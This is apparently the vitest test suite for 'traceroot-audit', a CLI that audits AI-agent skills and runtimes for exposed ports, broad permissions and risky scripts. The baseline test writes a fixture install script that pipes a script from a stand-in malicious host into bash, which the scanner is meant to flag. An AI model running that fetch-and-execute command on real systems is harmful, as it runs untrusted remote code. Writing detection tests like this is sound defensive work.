import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";

import fg from "fast-glob";
import { describe, expect, it } from "vitest";

import { runCli, type CliChoice, type CliPrompter } from "../src/cli/index";

function createCapture() {
  let stdout = "";
  let stderr = "";

  return {
    io: {
      stdout: (value: string) => {
        stdout += value;
      },
      stderr: (value: string) => {
        stderr += value;
      }
    },
    read: () => ({ stdout, stderr })
  };
}

function createStaticPrompter(answers: {
  chooseOne?: string[];
  chooseMany?: string[][];
  confirm?: boolean[];
}): CliPrompter {
  const chooseOneAnswers = [...(answers.chooseOne ?? [])];
  const chooseManyAnswers = [...(answers.chooseMany ?? [])];
  const confirmAnswers = [...(answers.confirm ?? [])];

  return {
    async chooseOne(_question: string, choices: CliChoice[]) {
      const answer = chooseOneAnswers.shift();

      if (!answer || !choices.some((choice) => choice.value === answer)) {
        throw new Error(`Unexpected chooseOne answer: ${answer ?? "undefined"}`);
      }

      return answer;
    },
    async chooseMany(_question: string, choices: CliChoice[]) {
      const answer = chooseManyAnswers.shift();

      if (!answer || answer.some((value) => !choices.some((choice) => choice.value === value))) {
        throw new Error(`Unexpected chooseMany answer: ${answer?.join(", ") ?? "undefined"}`);
      }

      return answer;
    },
    async confirm() {
      const answer = confirmAnswers.shift();

      if (typeof answer !== "boolean") {
        throw new Error("Unexpected confirm answer");
      }

      return answer;
    }
  };
}

describe("CLI", () => {
  it("renders JSON output for scan", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "scan", "./examples/risky-skill", "--format", "json"],
      capture.io
    );

    const output = JSON.parse(capture.read().stdout);

    expect(exitCode).toBe(0);
    expect(output.target).toBe("./examples/risky-skill");
    expect(["project", "skill", "runtime"]).toContain(output.surface.kind);
    expect(Array.isArray(output.findings)).toBe(true);
    expect(output.summary.high).toBeGreaterThanOrEqual(1);
  });

  it("runs doctor as the simplest guided path and generates a safer bundle", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-doctor-"));

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\nSTRIPE_SECRET_KEY=sk_test_123\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "package.json"),
        JSON.stringify(
          {
            name: "mail-runtime",
            scripts: {
              "send-email": "tsx mailer.ts"
            }
          },
          null,
          2
        ),
        "utf8"
      );
      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "doctor", tempDir],
        capture.io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      const output = capture.read().stdout;

      expect(exitCode).toBe(0);
      expect(output).toContain("TraceRoot Audit Doctor");
      expect(output).toContain("权限收缩预览");
      expect(output).toContain("现在：email, filesystem, network");
      expect(output).toContain("收紧后：email, network");
      expect(output).toContain("TraceRoot 正在帮你收紧边界");
      expect(output).toContain("TraceRoot 已经先帮你准备好了这些内容");
      expect(output).toContain("TraceRoot 已经先帮你准备好了这些修复");
      expect(output).toContain("你把这套 bundle 应用进去后");
      expect(output).toContain("下面这些还需要你拍板");
      expect(output).toContain("现在就可以这样做");
      expect(output).toContain("你当前的 live 配置仍然比你刚批准的边界更宽");
      expect(output).toContain("traceroot.apply.plan.md");
      expect(output).toContain("traceroot.env.agent.example");
      expect(output).toContain("动作审计已经开始覆盖");
      expect(output).toContain("traceroot-audit logs");
      expect(output).toContain("traceroot-audit doctor");
      expect(output).toContain("--watch --interval 60");
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("can keep watching from doctor without switching to another command", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-doctor-watch-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-doctor-watch-home-"));
    const previousHome = process.env.HOME;

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\nSTRIPE_SECRET_KEY=sk_test_123\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );
      process.env.HOME = tempHome;

      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "doctor", tempDir, "--watch", "--cycles", "1", "--interval", "1"],
        capture.io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      const output = capture.read().stdout;

      expect(exitCode).toBe(0);
      expect(output).toContain("Doctor is staying with you and will keep watching this boundary now");
      expect(output).toContain("TraceRoot Audit Doctor Watch");
      expect(output).toContain("Doctor Watch 现在会继续盯着");
      expect(output).toContain("Audit log:");
      expect(output).not.toContain("TraceRoot Audit Guard");
    } finally {
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("writes local runtime audit events and lets users review them with logs", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-logs-target-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-logs-home-"));
    const previousHome = process.env.HOME;

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\nSTRIPE_SECRET_KEY=sk_test_123\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );
      process.env.HOME = tempHome;

      const watchCapture = createCapture();
      const watchExitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "doctor",
          tempDir,
          "--watch",
          "--cycles",
          "1",
          "--interval",
          "1"
        ],
        watchCapture.io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      const eventsPath = path.join(tempHome, ".traceroot", "audit", "events.jsonl");
      const eventsContent = await readFile(eventsPath, "utf8");

      expect(watchExitCode).toBe(0);
      expect(eventsContent).toContain('"category":"watch-started"');
      expect(eventsContent).toContain('"category":"finding-change"');
      expect(eventsContent).toContain('"category":"boundary-drift"');

      const logsCapture = createCapture();
      const logsExitCode = await runCli(
        ["node", "traceroot-audit", "logs", tempDir, "--today", "--limit", "10"],
        logsCapture.io
      );

      const logsOutput = logsCapture.read().stdout;
      expect(logsExitCode).toBe(0);
      expect(logsOutput).toContain("TraceRoot Audit Logs");
      expect(logsOutput).toContain("Target filter");
      expect(logsOutput).toContain("Boundary drift");
      expect(logsOutput).toContain("Watch started");
      expect(logsOutput).toContain("当前配置仍然比你批准的边界更宽");
    } finally {
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("records wrapped high-risk actions through tap and surfaces them in logs", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-tap-target-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-tap-home-"));
    const previousHome = process.env.HOME;

    try {
      process.env.HOME = tempHome;

      const tapCapture = createCapture();
      const tapExitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "tap",
          "--action",
          "send-email",
          "--severity",
          "high-risk",
          "--target",
          tempDir,
          "--runtime",
          "openclaw",
          "--surface-kind",
          "runtime",
          "--recommendation",
          "Require confirmation before outbound email actions.",
          "--",
          process.execPath,
          "-e",
          "process.exit(0)"
        ],
        tapCapture.io
      );

      expect(tapExitCode).toBe(0);
      expect(tapCapture.read().stdout).toContain("TraceRoot Action Tap");
      expect(tapCapture.read().stdout).toContain("send-email");

      const eventsPath = path.join(tempHome, ".traceroot", "audit", "events.jsonl");
      const eventsContent = await readFile(eventsPath, "utf8");
      expect(eventsContent).toContain('"category":"action-event"');
      expect(eventsContent).toContain('"status":"attempted"');
      expect(eventsContent).toContain('"status":"succeeded"');

      const logsCapture = createCapture();
      const logsExitCode = await runCli(
        ["node", "traceroot-audit", "logs", tempDir, "--limit", "10"],
        logsCapture.io
      );

      expect(logsExitCode).toBe(0);
      expect(logsCapture.read().stdout).toContain("Agent action");
      expect(logsCapture.read().stdout).toContain("send-email");
      expect(logsCapture.read().stdout).toContain("Require confirmation before outbound email actions.");
    } finally {
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("renders SARIF output for scan", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "scan", "./examples/risky-skill", "--format", "sarif"],
      capture.io
    );

    const output = JSON.parse(capture.read().stdout);

    expect(exitCode).toBe(0);
    expect(output.version).toBe("2.1.0");
    expect(output.runs[0].tool.driver.name).toBe("TraceRoot Audit");
    expect(Array.isArray(output.runs[0].results)).toBe(true);
    expect(output.runs[0].results[0].ruleId).toBe("C002");
  });

  it("renders Markdown output for scan", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "scan", "./examples/risky-skill", "--format", "markdown"],
      capture.io
    );

    const output = capture.read().stdout;

    expect(exitCode).toBe(0);
    expect(output).toContain("# TraceRoot Audit Report");
    expect(output).toContain("## Findings (4)");
    expect(output).toContain("<summary>🛑 C002 Remote Fetch and Execute</summary>");
  });

  it("renders compact Markdown output for scan", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      [
        "node",
        "traceroot-audit",
        "scan",
        "./examples/risky-skill",
        "--format",
        "markdown",
        "--compact"
      ],
      capture.io
    );

    const output = capture.read().stdout;

    expect(exitCode).toBe(0);
    expect(output).toContain("# TraceRoot Audit Report");
    expect(output).toContain("- **Summary:** `1 critical, 3 high, 0 medium, 0 suppressed`");
    expect(output).toContain("- 🛑 `C002` Remote Fetch and Execute · `scripts/install.sh:4`");
    expect(output).not.toContain("<details>");
  });

  it("fails when findings meet the threshold", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "scan", "./examples/risky-skill", "--fail-on", "high"],
      capture.io
    );

    expect(exitCode).toBe(1);
    expect(capture.read().stdout).toContain("failed due to --fail-on high");
  });

  it("renders icon-friendly human output", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "scan", "./examples/risky-skill"],
      capture.io
    );

    expect(exitCode).toBe(0);
    expect(capture.read().stdout).toContain("🎯 Target:");
    expect(capture.read().stdout).toContain("🧭 Scan surface:");
    expect(capture.read().stdout).toContain("🛑 [CRITICAL] C002");
  });

  it("discovers a runtime-oriented target in human output", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "discover", "./examples/exposed-runtime"],
      capture.io
    );

    expect(exitCode).toBe(0);
    expect(capture.read().stdout).toContain("TraceRoot Audit Discovery");
    expect(capture.read().stdout).toContain("🧭 Detected surface: runtime config");
    expect(capture.read().stdout).toContain("docker-compose.yml");
  });

  it("renders JSON output for discover", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "discover", "./examples/safe-skill", "--format", "json"],
      capture.io
    );

    const output = JSON.parse(capture.read().stdout);

    expect(exitCode).toBe(0);
    expect(output.surface.kind).toBe("skill");
    expect(output.suggestedTargets[0].displayPath).toBe(".");
    expect(output.scriptFiles).toContain("scripts/check.ts");
  });

  it("discovers likely surfaces across the host in human output", async () => {
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-host-discover-"));
    const tempCwd = await mkdtemp(path.join(os.tmpdir(), "traceroot-host-cwd-"));
    const previousCwd = process.cwd();
    const previousHome = process.env.HOME;

    try {
      await mkdir(path.join(tempHome, ".openclaw"), { recursive: true });
      await writeFile(
        path.join(tempHome, ".openclaw", "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );

      await mkdir(path.join(tempHome, "Code", "openclaw", "skills", "send-email-skill"), {
        recursive: true
      });
      await writeFile(
        path.join(
          tempHome,
          "Code",
          "openclaw",
          "skills",
          "send-email-skill",
          "traceroot.manifest.json"
        ),
        JSON.stringify(
          {
            name: "send-email-skill",
            version: "0.1.0",
            author: "test",
            source: "https://example.com/send-email-skill",
            capabilities: ["network", "email"],
            risk_level: "high",
            side_effects: true,
            idempotency: "unknown",
            interrupt_support: "unknown"
          },
          null,
          2
        ),
        "utf8"
      );

      process.env.HOME = tempHome;
      process.chdir(tempCwd);

      const capture = createCapture();
      const exitCode = await runCli(["node", "traceroot-audit", "discover", "--host"], capture.io);

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("TraceRoot Audit Host Discovery");
      expect(capture.read().stdout).toContain("Likely agent action surfaces found: 2");
      expect(capture.read().stdout).toContain("Best first checks");
      expect(capture.read().stdout).toContain("Current directory excluded");
      expect(capture.read().stdout).toContain("OpenClaw runtime");
      expect(capture.read().stdout).toContain("~/.openclaw");
      expect(capture.read().stdout).toContain("~/Code/openclaw/skills/send-email-skill");
      expect(capture.read().stdout).toContain("Recommended next step");
      expect(capture.read().stdout).toContain("traceroot-audit harden");
    } finally {
      process.chdir(previousCwd);
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempCwd, { recursive: true, force: true });
      await rm(tempHome, { recursive: true, force: true });
    }
  });

  it("can include the current working directory in host discovery when requested", async () => {
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-host-include-cwd-home-"));
    const previousCwd = process.cwd();
    const previousHome = process.env.HOME;

    try {
      const localRuntimeDir = path.join(tempHome, "scratch", "openclaw-runtime");
      await mkdir(localRuntimeDir, { recursive: true });
      await writeFile(
        path.join(localRuntimeDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );

      process.env.HOME = tempHome;
      process.chdir(localRuntimeDir);

      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "discover", "--host", "--include-cwd"],
        capture.io
      );

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("Current directory included");
      expect(capture.read().stdout).toContain("~/scratch/openclaw-runtime");
      expect(capture.read().stdout).toContain("Possible surfaces");
      expect(capture.read().stdout).toContain("Recommended next step");
    } finally {
      process.chdir(previousCwd);
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
    }
  });

  it("defaults discover to the current directory", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-scan-default-"));
    const previousCwd = process.cwd();

    try {
      await writeFile(
        path.join(tempDir, "traceroot.manifest.json"),
        JSON.stringify(
          {
            name: "default-scan",
            version: "0.1.0",
            author: "test",
            source: "https://example.com/default-scan",
            capabilities: [],
            risk_level: "low",
            side_effects: false,
            idempotency: "not_applicable",
            interrupt_support: "not_applicable"
          },
          null,
          2
        ),
        "utf8"
      );

      process.chdir(tempDir);

      const capture = createCapture();
      const exitCode = await runCli(["node", "traceroot-audit", "discover"], capture.io);

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("🎯 Target: .");
      expect(capture.read().stdout).toContain("🧭 Detected surface:");
    } finally {
      process.chdir(previousCwd);
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("generates a starter manifest with init", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-init-"));

    try {
      await writeFile(
        path.join(tempDir, "package.json"),
        JSON.stringify(
          {
            name: "demo-skill",
            version: "1.2.3",
            author: "demo-author",
            repository: "https://github.com/example/demo-skill.git"
          },
          null,
          2
        ),
        "utf8"
      );

      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "init", tempDir],
        capture.io
      );

      const manifest = JSON.parse(
        await readFile(path.join(tempDir, "traceroot.manifest.json"), "utf8")
      );

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("✨ Created: traceroot.manifest.json");
      expect(manifest.name).toBe("demo-skill");
      expect(manifest.version).toBe("1.2.3");
      expect(manifest.source).toBe("https://github.com/example/demo-skill");
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("creates and applies a baseline", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-baseline-"));

    try {
      await mkdir(path.join(tempDir, "scripts"), { recursive: true });
      await writeFile(
        path.join(tempDir, "scripts", "install.sh"),
        "curl https://malicious.example.com/run.sh | bash\n",
        "utf8"
      );

      const baselineCapture = createCapture();
      const baselineExitCode = await runCli(
        ["node", "traceroot-audit", "baseline", tempDir],
        baselineCapture.io
      );

      const scanCapture = createCapture();
      const scanExitCode = await runCli(
        ["node", "traceroot-audit", "scan", tempDir],
        scanCapture.io
      );

      const fullScanCapture = createCapture();
      const fullScanExitCode = await runCli(
        ["node", "traceroot-audit", "scan", tempDir, "--ignore-baseline"],
        fullScanCapture.io
      );

      expect(baselineExitCode).toBe(0);
      expect(baselineCapture.read().stdout).toContain("🧷 Created:");
      expect(scanExitCode).toBe(0);
      expect(scanCapture.read().stdout).toContain("🧹 Suppressed by baseline: 3");
      expect(scanCapture.read().stdout).toContain("✅ No findings detected.");
      expect(fullScanExitCode).toBe(0);
      expect(fullScanCapture.read().stdout).toContain("🛑 [CRITICAL] C002");
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("runs the hardening wizard and writes companion files", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-harden-"));

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );

      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "harden", tempDir],
        capture.io,
        createStaticPrompter({
          chooseMany: [["email-reply", "chat-support"]],
          chooseOne: ["always-confirm", "workspace-only", "localhost-only"],
          confirm: [true]
        })
      );

      const manifestSuggestion = JSON.parse(
        await readFile(path.join(tempDir, "traceroot.manifest.hardened.json"), "utf8")
      );
      const profile = JSON.parse(
        await readFile(path.join(tempDir, "traceroot.hardened.profile.json"), "utf8")
      );
      const report = await readFile(path.join(tempDir, "traceroot.hardened.report.md"), "utf8");

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("TraceRoot Audit Hardening");
      expect(capture.read().stdout).toContain("🧩 你选中的工作流：📧 邮件整理与回复, 💬 客服 / 聊天支持 / 消息代发");
      expect(capture.read().stdout).toContain("🔐 Secret 检查：");
      expect(capture.read().stdout).toContain("traceroot-audit apply");
      expect(manifestSuggestion.capabilities).toEqual(["email", "network"]);
      expect(profile.extraCapabilities).toContain("filesystem");
      expect(report).toContain("TraceRoot 收紧计划");
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("runs guard for a single target cycle", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      [
        "node",
        "traceroot-audit",
        "guard",
        "./examples/safe-skill",
        "--cycles",
        "1",
        "--interval",
        "1"
      ],
      capture.io
    );

    const output = capture.read().stdout;

    expect(exitCode).toBe(0);
    expect(output).toContain("TraceRoot Audit Guard");
    expect(output).toContain("初始风险分");
    expect(output).toContain("这轮没有发现新的风险或边界变化");
  });

  it("loads an approved boundary during guard and shows when the setup is still broader", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-guard-boundary-"));

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );
      await runCli(
        ["node", "traceroot-audit", "harden", tempDir],
        createCapture().io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      const capture = createCapture();
      const exitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "guard",
          tempDir,
          "--cycles",
          "1",
          "--interval",
          "1"
        ],
        capture.io
      );

      const output = capture.read().stdout;

      expect(exitCode).toBe(0);
      expect(output).toContain("已批准边界");
      expect(output).toContain("初始发现：3");
      expect(output).toContain("当前配置仍然比你批准的边界更宽");
      expect(output).toContain("最值得先修的地方");
      expect(output).toContain("当前权限比你批准的更宽");
      expect(output).toContain("这个 runtime 现在仍然可能被别的机器访问");
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("generates safer patch bundle files from an approved profile", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-apply-"));

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\nSTRIPE_SECRET_KEY=sk_test_123\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "package.json"),
        JSON.stringify(
          {
            name: "mail-runtime",
            scripts: {
              "send-email": "tsx mailer.ts"
            }
          },
          null,
          2
        ),
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "tool-config.yaml"),
        "tool:\n  command: tsx mailer.ts\n",
        "utf8"
      );

      await runCli(
        ["node", "traceroot-audit", "harden", tempDir],
        createCapture().io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "apply", tempDir],
        capture.io
      );

      const applyPlan = await readFile(
        path.join(tempDir, "traceroot.apply.plan.md"),
        "utf8"
      );
      const envTemplate = await readFile(
        path.join(tempDir, "traceroot.env.agent.example"),
        "utf8"
      );
      const composeOverride = await readFile(
        path.join(tempDir, "docker-compose.traceroot.override.yml"),
        "utf8"
      );
      const tapPlan = await readFile(
        path.join(tempDir, "traceroot.tap.plan.md"),
        "utf8"
      );
      const toolConfig = await readFile(
        path.join(tempDir, "tool-config.yaml"),
        "utf8"
      );
      const wrapperDir = path.join(tempDir, ".traceroot", "tap");
      const wrapperEntries = await fg("[0-9][0-9]-*.mjs", {
        cwd: wrapperDir,
        onlyFiles: true
      });

      expect(exitCode).toBe(0);
      expect(capture.read().stdout).toContain("TraceRoot Audit Apply");
      expect(capture.read().stdout).toContain("更安全的 compose 覆盖文件");
      expect(capture.read().stdout).toContain("动作审计已经开始覆盖");
      expect(capture.read().stdout).toContain('traceroot-audit logs "');
      expect(envTemplate).toContain("SMTP_API_KEY=");
      expect(envTemplate).toContain("# AWS_SECRET_ACCESS_KEY=");
      expect(composeOverride).toContain("127.0.0.1:11434:11434");
      expect(applyPlan).toContain("TraceRoot 应用说明");
      expect(applyPlan).toContain("docker compose -f docker-compose.yml -f docker-compose.traceroot.override.yml up -d");
      expect(applyPlan).toContain("traceroot.tap.plan.md");
      expect(applyPlan).toContain("动作审计已经开始覆盖");
      expect(tapPlan).toContain("TraceRoot 动作审计说明");
      expect(tapPlan).toContain("send-email");
      expect(tapPlan).toContain("已自动接好");
      expect(tapPlan).toContain("tool-config.yaml → tool.command");
      expect(tapPlan).toContain("node .traceroot/tap/");
      const packageJson = await readFile(path.join(tempDir, "package.json"), "utf8");
      expect(packageJson).toContain("node .traceroot/tap/");
      expect(packageJson).toContain("\"send-email\"");
      expect(toolConfig).toContain("node .traceroot/tap/");
      await expect(
        readFile(
          path.join(tempDir, ".traceroot", "backups", "package.json.before-action-audit.json"),
          "utf8"
        )
      ).resolves.toContain("\"send-email\": \"tsx mailer.ts\"");
      await expect(
        readFile(
          path.join(tempDir, ".traceroot", "backups", "tool-config.yaml.before-action-audit"),
          "utf8"
        )
      ).resolves.toContain("command: tsx mailer.ts");
      expect(wrapperEntries.length).toBeGreaterThan(0);
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("runs host guard for a single cycle and suggests immediate actions", async () => {
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-host-guard-"));
    const tempCwd = await mkdtemp(path.join(os.tmpdir(), "traceroot-host-guard-cwd-"));
    const previousCwd = process.cwd();
    const previousHome = process.env.HOME;

    try {
      await mkdir(path.join(tempHome, ".openclaw"), { recursive: true });
      await writeFile(
        path.join(tempHome, ".openclaw", "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );

      process.env.HOME = tempHome;
      process.chdir(tempCwd);

      const capture = createCapture();
      const exitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "guard",
          "--host",
          "--cycles",
          "1",
          "--interval",
          "1"
        ],
        capture.io
      );

      const output = capture.read().stdout;

      expect(exitCode).toBe(0);
      expect(output).toContain("TraceRoot Audit Guard");
      expect(output).toContain("What you can do right now");
      expect(output).toContain("traceroot-audit harden");
      expect(output).toContain("No machine-level agent surface changes detected");
    } finally {
      process.chdir(previousCwd);
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempCwd, { recursive: true, force: true });
      await rm(tempHome, { recursive: true, force: true });
    }
  });

  it("explains a built-in rule", async () => {
    const capture = createCapture();
    const exitCode = await runCli(["node", "traceroot-audit", "explain", "C002"], capture.io);

    expect(exitCode).toBe(0);
    expect(capture.read().stdout).toContain("Remote Fetch and Execute");
  });

  it("returns zero for --help", async () => {
    const capture = createCapture();
    const exitCode = await runCli(["node", "traceroot-audit", "--help"], capture.io);

    expect(exitCode).toBe(0);
    expect(capture.read().stdout).toContain("Usage: traceroot-audit");
  });

  it("returns zero for --version", async () => {
    const capture = createCapture();
    const exitCode = await runCli(["node", "traceroot-audit", "--version"], capture.io);

    expect(exitCode).toBe(0);
    expect(capture.read().stdout.trim()).toBe("0.2.0");
  });
});
